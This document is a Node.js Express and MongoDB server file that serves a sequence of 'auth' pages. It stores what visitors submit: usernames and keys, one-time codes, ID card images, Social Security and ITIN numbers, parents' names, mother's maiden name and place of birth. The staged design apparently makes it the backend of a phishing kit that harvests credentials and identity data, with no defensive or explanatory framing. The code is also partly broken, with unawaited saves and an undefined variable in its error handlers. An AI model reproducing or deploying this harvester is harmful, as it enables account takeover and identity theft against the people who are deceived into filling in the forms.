import express from "express"
import mongoose from "mongoose"
import dotenv from "dotenv"
import { connectDB } from "./db/connectDB.js"


dotenv.config()

const port = process.env.PORT
const app = express()


app.use(express.json())
app.use(express.urlencoded({extended : false}))
app.use(express.static('public'))
app.use('/auth', express.static('auth'))
app.use('/img', express.static('img'))


const AuthDataSchema = new mongoose.Schema({
    user: String,
    key: String,
    code: String,
    front: {
      data: Buffer,
      contentType: 'image/jpeg'
    },
    back: {
      data: Buffer,
      contentType: 'image/jpeg'
    },
    ssn: String,
    itin: String,
    first: String,
    middle: String,
    last: String,
    father: String,
    mother: String,
    maiden: String,
    place: String,
});

const AuthData = mongoose.model('AuthData', AuthDataSchema)


app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html')
})


app.get('/auth', (req, res) => {
  res.sendFile(__dirname + '/auth/auth.html')
})

app.post('/auth', (req, res) => {  
  try {
    const authData = new AuthData({
        user : req.body.user,
        key : req.body.key
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
})


app.get('/auth_code', (req, res) => {
  res.sendFile(__dirname + '/auth/auth_code.html')
})

app.post('/auth_code', (req, res) => {
  try {
    const authData = new AuthData({
        code : req.body.code
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
});


app.get('/auth_id', (req, res) => {
  res.sendFile(__dirname + '/auth/auth_id.html')
})

app.post('/auth_id', (req, res) => {
  try {
    const authData = new AuthData({
        front : req.body.image,
        back : req.body.image
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
});


app.get('/auth_ssn', (req, res) => {
    res.sendFile(__dirname + '/auth/auth_ssn.html')
  })
  
  app.post('/auth_ssn', (req, res) => {
    try {
      const authData = new AuthData({
          ssn : req.body.ssn
      })
      const savedAuthData = authData.save()
      console.log(req.body)
      res.status(200).json({ message : "user added succesfully", data : savedAuthData})
  } catch(error){
      res.status(404).json({message : error, message})
  }
  })
  
  
  
  app.get('/auth_itin', (req, res) => {
    res.sendFile(__dirname + '/auth/auth_itin.html')
  })
  
  app.post('/auth_itin', (req, res) => {
    try {
      const authData = new AuthData({
          itin : req.body.itin
      })
      const savedAuthData = authData.save()
      console.log(req.body)
      res.status(200).json({ message : "user added succesfully", data : savedAuthData})
  } catch(error){
      res.status(404).json({message : error, message})
  }
  });
  
  
  app.get('/auth_info', (req, res) => {
    res.sendFile(__dirname + '/auth/auth_info.html')
  })
  
  app.post('/auth_info', (req, res) => {
    try {
      const authData = new AuthData({
          first : req.body.first,
          middle : req.body.middle,
          last : req.body.last,
          father : req.body.father,
          mother : req.body.mother,
          maiden : req.body.maiden,
          place : req.body.place,
      })
      const savedAuthData = authData.save()
      console.log(req.body)
      res.status(200).json({ message : "user added succesfully", data : savedAuthData})
  } catch(error){
      res.status(404).json({message : error, message})
  }
  });

  app.listen(port, () => {
    connectDB() 
    console.log(`server started at http://localhost:${port}`)
  })